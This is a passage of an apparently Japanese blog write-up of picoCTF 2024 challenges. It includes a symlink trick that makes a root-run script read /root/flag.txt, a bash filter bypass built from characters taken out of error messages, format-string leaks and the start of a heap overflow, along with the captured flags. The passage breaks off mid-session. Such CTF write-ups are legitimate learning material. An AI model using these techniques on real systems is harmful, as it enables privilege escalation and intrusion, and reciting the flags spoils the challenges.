<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">% ssh -p 62850 ctf-player@atlas.picoctf.net</span><br><span class="line">ctf-player@atlas.picoctf.net<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">ctf-player@atlas.picoctf.net&#x27;</span>s password:</span><br><span class="line">bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)</span><br><span class="line">bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)</span><br><span class="line">Welcome to the Binary Search Game!</span><br><span class="line">I<span class="string">&#x27;m thinking of a number between 1 and 1000.</span></span><br><span class="line"><span class="string">Enter your guess: 500</span></span><br><span class="line"><span class="string">Higher! Try again.</span></span><br><span class="line"><span class="string">Enter your guess: 750</span></span><br><span class="line"><span class="string">Higher! Try again.</span></span><br><span class="line"><span class="string">Enter your guess: 825</span></span><br><span class="line"><span class="string">Lower! Try again.</span></span><br><span class="line"><span class="string">Enter your guess: 770</span></span><br><span class="line"><span class="string">Higher! Try again.</span></span><br><span class="line"><span class="string">Enter your guess: 800</span></span><br><span class="line"><span class="string">Lower! Try again.</span></span><br><span class="line"><span class="string">Enter your guess: 785</span></span><br><span class="line"><span class="string">Congratulations! You guessed the correct number: 785</span></span><br><span class="line"><span class="string">Here&#x27;</span>s your flag: picoCTF&#123;g00d_gu355_de9570b0&#125;</span><br><span class="line">Connection to atlas.picoctf.net closed.</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{g00d_gu355_de9570b0}

</aside>

<h3><span id="endianness">endianness</span></h3><img src="/img/2024/03-27/Untitled%2045.png" width="550px" height="auto"> 

<p>ソースコードももらえているので、インタラクティブなソルバーを書いた。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添付ソースと同じもの</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">find_little_endian</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *word)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> word_len = <span class="built_in">strlen</span>(word);</span><br><span class="line">    <span class="type">char</span> *little_endian = (<span class="type">char</span> *)<span class="built_in">malloc</span>((<span class="number">2</span> * word_len + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = word_len; i-- &gt; <span class="number">0</span>;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(&amp;little_endian[(word_len - <span class="number">1</span> - i) * <span class="number">2</span>], <span class="number">3</span>, <span class="string">&quot;%02X&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)word[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    little_endian[<span class="number">2</span> * word_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> little_endian;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添付ソースと同じもの</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">find_big_endian</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *word)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> length = <span class="built_in">strlen</span>(word);</span><br><span class="line">    <span class="type">char</span> *big_endian = (<span class="type">char</span> *)<span class="built_in">malloc</span>((<span class="number">2</span> * length + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(&amp;big_endian[i * <span class="number">2</span>], <span class="number">3</span>, <span class="string">&quot;%02X&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)word[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    big_endian[<span class="number">2</span> * length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> big_endian;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> challenge_word[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter the word\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, challenge_word);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(1) little endian\n(2) big endian\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> choice;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Little Endian: %s\n&quot;</span>, find_little_endian(challenge_word));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Big Endian: %s\n&quot;</span>, find_big_endian(challenge_word));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Invalid choice\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>こいつ使ってlittle, big endianのhexを出力し、フラグゲット。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">% nc titan.picoctf.net <span class="number">51120</span></span><br><span class="line">Welcome to the Endian CTF!</span><br><span class="line">You need to find both the little endian and big endian representations of a word.</span><br><span class="line">If you get both correct, you will receive the flag.</span><br><span class="line">Word: gvdgo</span><br><span class="line">Enter the Little Endian representation: <span class="number">6F</span>67647667</span><br><span class="line">Correct Little Endian representation!</span><br><span class="line">Enter the Big Endian representation: <span class="number">677664676F</span></span><br><span class="line">Correct Big Endian representation!</span><br><span class="line">Congratulations! You found both endian representations correctly!</span><br><span class="line">Your Flag is: picoCTF&#123;<span class="number">3</span>ndi4n_sw4p_su33ess_d58517b6&#125;</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{3ndi4n_sw4p_su33ess_d58517b6}

</aside>

<h3><span id="dont-you-love-banners">dont-you-love-banners</span></h3><img src="/img/2024/03-27/Untitled%2046.png" width="550px" height="auto"> 

<p>まず上に書いてある方にnc。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% nc tethys.picoctf.net <span class="number">56157</span></span><br><span class="line">SSH<span class="number">-2.0</span>-OpenSSH_7<span class="number">.6</span>p1 My_Passw@rd_@<span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>sshの？パスワードが見える。</p>
<p>次に下に書いてある方にnc。さっきのパスワードと、クイズ（これいる？）の答えをググって入力。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">% nc tethys.picoctf.net <span class="number">57443</span></span><br><span class="line">*************************************</span><br><span class="line">**************WELCOME****************</span><br><span class="line">*************************************</span><br><span class="line"></span><br><span class="line">what is the password?</span><br><span class="line">My_Passw@rd_@<span class="number">1234</span></span><br><span class="line">What is the top cyber security conference in the world?</span><br><span class="line">DEFCON</span><br><span class="line">the first hacker ever was known <span class="keyword">for</span> <span class="title function_">phreaking</span><span class="params">(making <span class="built_in">free</span> phone calls)</span>, who was it?</span><br><span class="line">John Draper</span><br><span class="line"></span><br><span class="line">player@challenge:~$ ls -l</span><br><span class="line">ls -l</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 player player 114 Feb  7 17:25 banner</span><br><span class="line">-rw-r--r-- 1 root   root    13 Feb  7 17:25 text</span><br><span class="line">player@challenge:~$ id</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1000</span>(player) gid=<span class="number">1000</span>(player) groups=<span class="number">1000</span>(player)</span><br></pre></td></tr></table></figure>

<p>こんな感じでシェルログインさせてもらえる。目的の <code>/root/flag.txt</code> はログインユーザーでは読めない。</p>
<p>下記の <code>/root/script.py</code> がrootユーザーで実行されるさっきの問答。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">player@challenge:~$ cat /root/script.py</span><br><span class="line">cat /root/script.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"></span><br><span class="line">incorrect_ans_reply = <span class="string">&quot;Lol, good try, try again and good luck\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/player/banner&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(f.read())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;*********************************************&quot;</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;***************DEFAULT BANNER****************&quot;</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;*Please supply banner in /home/player/banner*&quot;</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;*********************************************&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 以下略</span></span><br></pre></td></tr></table></figure>

<p>rootユーザーで <code>/home/player/banner</code> をreadしているので、そのファイルを <code>/root/flag.txt</code> に置き換えてやれば良い。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">player@challenge:~$ <span class="built_in">mv</span> banner banner.bak</span><br><span class="line"><span class="built_in">mv</span> banner banner.bak</span><br><span class="line">player@challenge:~$ <span class="built_in">ln</span> -s /root/flag.txt banner</span><br><span class="line"><span class="built_in">ln</span> -s /root/flag.txt banner</span><br></pre></td></tr></table></figure>

<p>この状態でもう一度ncすると、フラグゲット。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% nc tethys.picoctf.net 57443</span><br><span class="line">picoCTF&#123;b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0&#125;</span><br><span class="line"></span><br><span class="line">what is the password?</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

</aside>

<h3><span id="sansalpha">SansAlpha</span></h3><img src="/img/2024/03-27/Untitled%2047.png" width="550px" height="auto"> 

<p>難しかった！</p>
<p>sshでつなぐと、bashの上に「アルファベット入力全部弾く」フィルタが掛かったシェルに通される。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SansAlpha$ <span class="built_in">ls</span></span><br><span class="line">SansAlpha: Unknown character detected</span><br><span class="line">SansAlpha$ @@@</span><br><span class="line">bash: @@@: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>流石に英字がないのは厳しいのでなんとか手に入れたい。エラー出力から手に入れよう。</p>
<ul>
<li>エラー出力を変数に代入し、</li>
<li>その変数内の文字を1文字ずつ取り出し、</li>
<li>バッククオートの中でコマンドとして実行させる</li>
</ul>
<p>というアイディアで色々とコマンドが打てるようになる。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 変数 $_1 に、エラー出力である &quot;bash: @@@@@@: command not found&quot; の文字列を代入</span></span><br><span class="line">SansAlpha$ _1=`@@@@@@ 2&gt;&amp;1`</span><br><span class="line"></span><br><span class="line"><span class="comment">## 変数 $_1 をコマンドとして実行し、「bashはそんなコマンド知らないよ」エラーを受け取ることで、 $_1 の内容を確認</span></span><br><span class="line">SansAlpha$ `<span class="string">&quot;<span class="variable">$_1</span>&quot;</span>`</span><br><span class="line">bash: bash: @@@@@@: <span class="built_in">command</span> not found: <span class="built_in">command</span> not found</span><br><span class="line"><span class="comment">##     ^      この間が $_1             ^</span></span><br></pre></td></tr></table></figure>

<p>“bash: @@@@@@: command not found” の文字列から c, a, t が取り出せる。つまりcatコマンドが手に入る！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## $_1 の(0-originで) 14文字目(c), 1文字目(a), 24文字目(t) を $_2 に代入</span></span><br><span class="line">SansAlpha$ _2=<span class="string">&quot;<span class="variable">$&#123;_1:14:1&#125;</span><span class="variable">$&#123;_1:1:1&#125;</span><span class="variable">$&#123;_1:24:1&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## pwdのファイルを全部catしてみる</span></span><br><span class="line">SansAlpha$ `<span class="variable">$_2</span> *`</span><br><span class="line"><span class="built_in">cat</span>: blargh: Is a directory</span><br><span class="line">bash: The: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>“The” の部分はファイルが読めていそう。 “blargh” の部分は、その名前のディレクトリをcatしちゃってる。深入りしてみる。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## The の方のファイルの中身を $_3 に代入</span></span><br><span class="line">SansAlpha$ _3=`<span class="variable">$_2</span> *`</span><br><span class="line"><span class="built_in">cat</span>: blargh: Is a directory</span><br><span class="line"></span><br><span class="line"><span class="comment">## こっちのファイルにはフラグがない</span></span><br><span class="line">SansAlpha$ `<span class="string">&quot;<span class="variable">$_3</span>&quot;</span>`</span><br><span class="line">bash: $<span class="string">&#x27;The Calastran multiverse is a complex and interconnected web of realities, each\nwith its own distinct characteristics and rules. At its core is the Nexus, a\ncosmic hub that serves as the anchor point for countless universes and\ndimensions. These realities are organized into Layers, with each Layer\nrepresenting a unique</span></span><br><span class="line"><span class="string"> level of existence, ranging from the fundamental building\nblocks of reality to the most intricate and fantastical realms. Travel between\nLayers is facilitated by Quantum Bridges, mysterious conduits that allow\nindividuals to navigate the multiverse. Notably, the Calastran multiverse\nexhibits a dynamic nature, with the Fabric</span></span><br><span class="line"><span class="string">of Reality continuously shifting and\nevolving. Within this vast tapestry, there exist Nexus Nodes, focal points of\nimmense energy that hold sway over the destinies of entire universes. The\nenigmatic Watchers, ancient beings attuned to the ebb and flow of the\nmultiverse, observe and influence key events. While the structure of</span></span><br><span class="line"><span class="string">Calastran\nembraces diversity, it also poses challenges, as the delicate balance between\nthe Layers requires vigilance to prevent catastrophic breaches and maintain the\ncosmic harmony.&#x27;</span>: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line"><span class="comment">## blargh ディレクトリ名を $_5 に代入</span></span><br><span class="line">SansAlpha$ _4=`<span class="variable">$_2</span> * 2&gt;&amp;1`</span><br><span class="line">SansAlpha$ `<span class="string">&quot;<span class="variable">$_4</span>&quot;</span>`</span><br><span class="line">bash: $<span class="string">&#x27;cat: blargh: Is a directory(後略)</span></span><br><span class="line"><span class="string">SansAlpha$ _5=&quot;$&#123;_4:5:6&#125;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## blargh ディレクトリの中のファイルをcatし、その中を読む</span></span><br><span class="line"><span class="string">SansAlpha$ _6=`$_2 $_5/*`</span></span><br><span class="line"><span class="string">SansAlpha$ `&quot;$_6&quot;`</span></span><br><span class="line"><span class="string">bash: $&#x27;</span><span class="built_in">return</span> 0 picoCTF&#123;7h15_mu171v3r53_15_m4dn355_145256ec&#125;Alpha-9, a distinctive layer within the Calastran multiverse, stands as a\nsanctuary realm offering individuals a rare opportunity <span class="keyword">for</span> rebirth and\nintrospection. Positioned as a serene refuge between the higher and lower\nLayers, Alpha-9 serves as a cosmic haven <span class="built_in">where</span> beings can start anew,\nunburdened by the complexities of their past lives. The realm is characterized\nby ethereal landscapes and soothing energies that facilitate healing and\nself-discovery. Quantum Resonance Wells, unique to Alpha-9, act as conduits <span class="keyword">for</span>\nindividuals to reflect on their past experiences from a safe and contemplative\ndistance. Here, time flows differently, providing a respite <span class="keyword">for</span> those seeking\nsolace and renewal. Residents of Alpha-9 find themselves surrounded by an\natmosphere of rejuvenation, encouraging personal growth and the exploration of\nuntapped potential. While the layer offers a haven <span class="keyword">for</span> introspection, it is not\nwithout its challenges, as individuals must confront their past and navigate\nthe delicate equilibrium between redemption and self-acceptance within this\ntranquil cosmic retreat.<span class="string">&#x27;: command not found</span></span><br></pre></td></tr></table></figure>

<p>やっとフラグ。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{7h15_mu171v3r53_15_m4dn355_145256ec}

</aside>

<h2><span id="binary-exploitation">Binary Exploitation</span></h2><h3><span id="format-string-0">format string 0</span></h3><img src="/img/2024/03-27/Untitled%2048.png" width="550px" height="auto"> 

<p>タイトルからして書式文字列攻撃。</p>
<p>ただし、 <code>printf()</code> にフォーマット指定子なしで直接渡される文字列は、 <code>on_menu()</code> 関数で所定の文字列との完全一致判定されているので自由度はない。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 抜粋1</span></span><br><span class="line">    <span class="type">char</span> *menu1[<span class="number">3</span>] = &#123;<span class="string">&quot;Breakf@st_Burger&quot;</span>, <span class="string">&quot;Gr%114d_Cheese&quot;</span>, <span class="string">&quot;Bac0n_D3luxe&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (!on_menu(choice1, menu1, <span class="number">3</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;There is no such burger yet!\n&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="built_in">printf</span>(choice1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抜粋2</span></span><br><span class="line">    <span class="type">char</span> *menu2[<span class="number">3</span>] = &#123;<span class="string">&quot;Pe%to_Portobello&quot;</span>, <span class="string">&quot;$outhwest_Burger&quot;</span>, <span class="string">&quot;Cla%sic_Che%s%steak&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (!on_menu(choice2, menu2, <span class="number">3</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;There is no such burger yet!\n&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(choice2);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最初の選択で <code>Gr%114d_Cheese</code>, 次の選択で <code>Cla%sic_Che%s%steak</code> を選べばフラグがリーク。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">% nc mimas.picoctf.net <span class="number">60904</span></span><br><span class="line">Welcome to our newly-opened burger place Pico <span class="string">&#x27;n Patty! Can you help the picky customers find their favorite burger?</span></span><br><span class="line"><span class="string">Here comes the first customer Patrick who wants a giant bite.</span></span><br><span class="line"><span class="string">Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe</span></span><br><span class="line"><span class="string">Enter your recommendation: Gr%114d_Cheese</span></span><br><span class="line"><span class="string">Gr                                                                                                           4202954_Cheese</span></span><br><span class="line"><span class="string">Good job! Patrick is happy! Now can you serve the second customer?</span></span><br><span class="line"><span class="string">Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)</span></span><br><span class="line"><span class="string">Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak</span></span><br><span class="line"><span class="string">Enter your recommendation: Cla%sic_Che%s%steak</span></span><br><span class="line"><span class="string">ClaCla%sic_Che%s%steakic_Che(null)</span></span><br><span class="line"><span class="string">picoCTF&#123;7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4&#125;</span></span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}

</aside>

<h3><span id="heap-0">heap 0</span></h3><img src="/img/2024/03-27/Untitled%2049.png" width="550px" height="auto"> 

<p>タイトルと問題文からして、ヒープオーバーフローの問題。</p>
<p>ヒープにセットされているcanary文字列 <code>&quot;bico&quot;</code> を書き換えてフラグ表示機能を叩けばOK。<br>ヒープの状態をわかりやすく表示してくれる機能とヒープにサイズ無制限で書き込む機能があって至れり尽くせり。</p>
<p>ヒープレイアウトを見ると、33文字以上の文字列を書き込めばOK。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">% nc tethys.picoctf.net <span class="number">61327</span></span><br><span class="line"></span><br><span class="line">Welcome to heap0!</span><br><span class="line">I put my data on the heap so it should be safe from any tampering.</span><br><span class="line">Since my data isn<span class="number">&#x27;</span>t on the <span class="built_in">stack</span> I<span class="number">&#x27;ll</span> even let you write whatever info you want to the heap, I already took care of using <span class="built_in">malloc</span> <span class="keyword">for</span> you.</span><br><span class="line"></span><br><span class="line">Heap State:</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*] Address   -&gt;   Heap Data</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*]   <span class="number">0x560649bd12b0</span>  -&gt;   pico</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*]   <span class="number">0x560649bd12d0</span>  -&gt;   bico</span><br><span class="line">+-------------+----------------+</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Print Heap:          (print the current state of the heap)</span><br><span class="line"><span class="number">2.</span> Write to buffer:     (write to your own personal block of data on the heap)</span><br><span class="line"><span class="number">3.</span> Print safe_var:      (I<span class="number">&#x27;ll</span> even let you look at my variable on the heap, I<span class="number">&#x27;</span>m confident it can<span class="number">&#x27;</span>t be modified)</span><br><span class="line"><span class="number">4.</span> Print Flag:          (Try to print the flag, good luck)</span><br><span class="line"><span class="number">5.</span> Exit</span><br><span class="line"></span><br><span class="line">Enter your choice: <span class="number">2</span></span><br><span class="line">Data <span class="keyword">for</span> buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Print Heap:          (print the current state of the heap)</span><br><span class="line"><span class="number">2.</span> Write to buffer:     (write to your own personal block of data on the heap)</span><br><span class="line"><span class="number">3.</span> Print safe_var:      (I<span class="number">&#x27;ll</span> even let you look at my variable on the heap, I<span class="number">&#x27;</span>m confident it can<span class="number">&#x27;</span>t be modified)</span><br><span class="line"><span class="number">4.</span> Print 